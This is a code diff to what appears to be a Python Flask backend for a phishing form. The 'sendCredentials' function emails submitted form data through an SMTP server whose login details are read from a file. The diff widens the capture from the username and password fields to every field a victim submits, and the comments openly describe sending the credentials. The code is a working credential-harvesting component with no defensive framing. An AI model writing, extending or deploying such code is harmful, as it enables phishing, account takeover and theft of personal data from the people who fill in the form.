@@ -10,6 +10,7 @@ SMTPInformation = list()
 for line in file_obj:
 	SMTPInformation.append((line.split(':'))[1].strip())
 
+file_obj.close()
 #Assign the variables names for concise access
 senderEmail = SMTPInformation[0]
 senderPassword = SMTPInformation[1]
@@ -17,9 +18,11 @@ senderServer = SMTPInformation[2]
 senderPort = SMTPInformation[3]
 
 #The method that sets up the SMTP connection and sends the credentials.
-def sendCredentials(user, password):
+def sendCredentials(allFields):
 	#Set message to a formatted String that includes the email header and content
-	message = 'From: Form Submission <'+senderEmail+'>\nTo: Form Reception <'+senderEmail+'>'+'\nSubject: Form Submission\n\n'+'Username = '+user+' Password = '+password
+	message = 'From: Form Submission <'+senderEmail+'>\nTo: Form Reception <'+senderEmail+'>'+'\nSubject: Form Submission\n\n'
+	for key in allFields:
+		message = message+" " +key+" : "+allFields[key]
 	#Open the connection and send the credentials
 	server = smtplib.SMTP(senderServer+':'+senderPort)
 	server.ehlo
@@ -40,9 +43,8 @@ def formPage():
 	if request.method == 'POST':
 		try:
 			#Get the variables from the POST request
-			username = request.form['username']
-			password = request.form['password']
-			sendCredentials(username, password) 
+			allFields = request.form
+			sendCredentials(allFields) 
 			return render_template("simple_form.html")
 		except Exception, e:
 			return render_template('index.html')
